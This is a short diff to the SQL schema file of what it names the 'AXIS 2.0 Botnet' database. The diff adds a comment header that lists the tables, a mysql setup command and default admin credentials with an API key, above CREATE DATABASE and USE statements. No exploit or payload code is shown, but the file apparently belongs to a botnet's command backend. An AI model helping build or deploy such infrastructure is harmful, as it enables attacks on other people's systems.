@@ -1,5 +1,13 @@
 -- AXIS 2.0 Botnet Database Schema
--- Run: mysql -u root -p < database.sql
+-- ============================================================================
+-- Database: MySQL/MariaDB
+-- Tables: users, history, whitelist, logins, online
+-- 
+-- Setup: mysql -u root -p < database.sql
+-- 
+-- Default Credentials (CHANGE IMMEDIATELY!):
+--   Username: admin | Password: admin123 | API Key: AXIS2-ADMIN-APIKEY
+-- ============================================================================
 
 CREATE DATABASE IF NOT EXISTS AXIS2;
 USE AXIS2;
